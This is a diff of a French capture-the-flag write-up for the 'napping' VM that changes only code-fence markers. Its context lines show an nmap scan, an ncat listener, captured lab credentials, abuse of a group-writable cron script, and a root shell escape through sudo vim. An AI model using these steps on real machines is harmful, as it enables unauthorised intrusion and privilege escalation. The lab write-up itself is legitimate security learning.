@@ -25,13 +25,13 @@ Au menu
 
 Si vous configurez votre réseau hôte avec une plage d’adresse DHCP de petite taille vous n'aurez aucun problème à deviner l'adresse IP de la VM mais dans le doute vous pouvez toujours effectuer un scan ping sur le réseau :  
 
-```plain
+```
 sudo nmap -sP -T5 192.168.3.0/24 -v
 ```
 
 Dans l'output il sera aisé de retrouver la VM car son adresse MAC sera affichée comme étant liée au constructeur VirtualBox (note: j'ai remplacé l'IP par *napping* dans l'article) :  
 
-```plain
+```
 Nmap scan report for napping
 Host is up, received arp-response (0.00046s latency).
 MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
@@ -93,7 +93,7 @@ A ce stade là, au vue de la fonctionnalité annoncée et l'absence d'autres fai
 
 On place donc un Ncat en écoute et on renseigne notre URL dans le formulaire:  
 
-```plain
+```
 
 $ ncat -l -p 8888 -v
 Ncat: Version 7.80 ( https://nmap.org/ncat )
@@ -150,7 +150,7 @@ Je télécharge la page de login du CTF, modifie l'entrée *action* du formulair
 
 Je lance ensuite Wireshark et soumet l'URL. Au bout de quelques minutes j'ai une requête POST avec ces données:  
 
-```plain
+```
 username=daniel&password=C%40ughtm3napping123
 ```
 
@@ -163,7 +163,7 @@ Escalading
 
 Ce compte fait partie du groupe *administrators* :  
 
-```plain
+```
 uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
 ```
 
@@ -175,13 +175,13 @@ find / -group administrators  2> /dev/null
 
 Parmi les résultats il y a un fichier appartenant à l'utilisateur *adrian* :  
 
-```plain
+```
 /home/adrian/query.py
 ```
 
 et les membres du groupe ont accès en écriture :  
 
-```plain
+```
 -rw-rw-r-- 1 adrian administrators  481 Oct 30 19:15 query.py
 ```
 
@@ -221,7 +221,7 @@ Tue Nov 16 22:36:50 UTC 2021
 
 On le retrouve dans la crontab de l'utilisateur (*crontab -l*):  
 
-```plain
+```
 */2 * * * * /usr/bin/python3 /home/adrian/query.py
 ```
 
@@ -250,7 +250,7 @@ On édite *query.py* avec Vim et on rajoute notre code au début.
 
 Quelques temps après notre clé est acceptée pour la connexion au compte adrian :  
 
-```plain
+```
 
 adrian@napping:~$ cat user.txt
 You are nearly there!
@@ -259,7 +259,7 @@ You are nearly there!
 
 Premier réflexe, voir ce qu'il est possible de faire avec ce compte membre du groupe *administrators* :  
 
-```plain
+```
 adrian@napping:~$ sudo -l
 Matching Defaults entries for adrian on napping:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -270,7 +270,7 @@ User adrian may run the following commands on napping:
 
 On a un classique cas de lolbin. Sudo autorise l'exécution de */usr/bin/vim* (il faut donner le path en entier) en tant que root sans mot de passe. De là on utilisera la commande *:!bash* pour nous échapper de Vim et accéder à un shell.  
 
-```plain
+```
 
 sudo /usr/bin/vim
 (--snip exécution de bash via :!bash snip--)
